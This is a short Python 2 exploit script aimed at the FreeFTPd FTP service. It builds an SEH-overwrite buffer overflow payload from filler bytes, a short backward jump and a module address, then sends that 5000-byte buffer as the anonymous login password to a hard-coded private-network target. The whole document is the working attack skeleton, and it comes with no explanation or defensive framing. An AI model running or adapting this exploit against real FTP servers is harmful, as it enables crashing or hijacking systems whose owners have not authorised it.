import socket
import os
import sys
from ftplib import FTP

Seh  = "\xeb\x80\x90\x90" # Jump back 126 Bytes
nSeh = "\x26\x42\x41\x00" # 0x00414226 ASLR: False, Rebase: False, SafeSEH: False, OS: False - FreeFTPDService.exe

buffer  = "A" * 671
buffer += "B" * 126
buffer += Seh
buffer += nSeh
buffer += "D" * (5000 - len(buffer))

print "[*] Sending evil ftp request to target"
ftp = FTP()
ftp.connect('192.168.100.120', 21)
ftp.login('anonymous', buffer)

